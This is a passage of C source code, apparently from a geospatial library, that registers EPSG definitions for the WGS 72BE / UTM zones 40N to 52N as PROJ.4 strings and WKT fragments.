\"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",51],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32439\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32440, \"epsg\", 32440,\n        \"WGS 72BE / UTM zone 40N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=40 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 40N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",57],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32440\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32441, \"epsg\", 32441,\n        \"WGS 72BE / UTM zone 41N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=41 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 41N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",63],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32441\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32442, \"epsg\", 32442,\n        \"WGS 72BE / UTM zone 42N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=42 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 42N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",69],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32442\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32443, \"epsg\", 32443,\n        \"WGS 72BE / UTM zone 43N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=43 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 43N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",75],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32443\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32444, \"epsg\", 32444,\n        \"WGS 72BE / UTM zone 44N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=44 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 44N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",81],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32444\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32445, \"epsg\", 32445,\n        \"WGS 72BE / UTM zone 45N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=45 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 45N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",87],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32445\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32446, \"epsg\", 32446,\n        \"WGS 72BE / UTM zone 46N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=46 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 46N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",93],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32446\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32447, \"epsg\", 32447,\n        \"WGS 72BE / UTM zone 47N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=47 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 47N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",99],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32447\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32448, \"epsg\", 32448,\n        \"WGS 72BE / UTM zone 48N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=48 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 48N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",105],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32448\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32449, \"epsg\", 32449,\n        \"WGS 72BE / UTM zone 49N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=49 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 49N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",111],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32449\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32450, \"epsg\", 32450,\n        \"WGS 72BE / UTM zone 50N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=50 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 50N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",117],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32450\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32451, \"epsg\", 32451,\n        \"WGS 72BE / UTM zone 51N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=51 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 51N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",123],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32451\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32452, \"epsg\", 32452,\n        \"WGS 72BE / UTM zone 52N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=52 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 52N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",129],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        